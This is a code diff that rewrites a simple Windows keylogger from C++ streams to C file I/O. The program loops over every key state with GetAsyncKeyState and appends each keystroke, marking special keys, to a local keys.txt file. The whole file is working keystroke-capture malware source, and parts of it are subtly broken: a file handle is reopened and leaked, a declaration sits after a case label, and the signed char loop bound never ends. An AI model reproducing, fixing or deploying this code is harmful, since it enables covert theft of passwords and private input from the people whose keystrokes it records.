@@ -1,56 +1,68 @@
-#include <iostream>
+
+#include <stdio.h>
+#include <stdlib.h>
 #include <windows.h>
 #include <winuser.h>
-#include <fstream>
+
 
 // this file still needs fixing 
 
 void startLogging();
 
 int main(){
-    ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
     startLogging();
     return 0; 
 }
 
 void startLogging(){
-    
+    FILE *keysPtr;
+    keysPtr = fopen("keys.txt", "w");
+    keysPtr = fopen("keys.txt", "a");
     char c;
-    while(true){
+    while(1){
         for (c = 0; c < 255; c++){
-            bool pressed = GetAsyncKeyState(c) & 0x1;
+            short pressed = GetAsyncKeyState(c) & 0x1;
             if (pressed){
-                // cout << c;
-                ofstream keys;
-                keys.open("keys.txt", ios::app);
+                const char *text;
                 switch (c) {
                     case VK_BACK:
-                        keys << "[backspace]";
+                        text = "[backspace]";
+                        fprintf(keysPtr, "%s", text);
                         break;
                     case VK_RETURN:
-                        keys << "[enter]";
+                        text = "[enter]";
+                        fprintf(keysPtr, "%s", text);
                         break;
                     case VK_SHIFT:
-                        keys << "[shift]";
+                        text = "[shift]";
+                        fprintf(keysPtr, "%s", text);
                         break;
                     case VK_CONTROL:
-                        keys << "[ctrl]";
+                        text = "[ctrl]";
+                        fprintf(keysPtr, "%s", text);
                         break;
                     case VK_CAPITAL:
-                        keys << "[caps]";
+                        text = "[caps]";
+                        fprintf(keysPtr, "%s", text);
                         break;
                     case VK_TAB:
-                        keys << "[tab]";
+                        text = "[tab]";
+                        fprintf(keysPtr, "%s", text);
                         break;
                     case VK_MENU:
-                        keys << "[alt]";
+                        text = "[alt]";
+                        fprintf(keysPtr, "%s", text);
                         break;
                     case VK_LBUTTON:
                         break;
                     case VK_RBUTTON:
                         break; 
                     default:
-                        keys << c;   
+                        char str[2];
+                        str[0] = c;
+                        str[1] = '\0';
+                        text = str;
+                        fprintf(keysPtr, "%s", text);
                 }
                 
             }
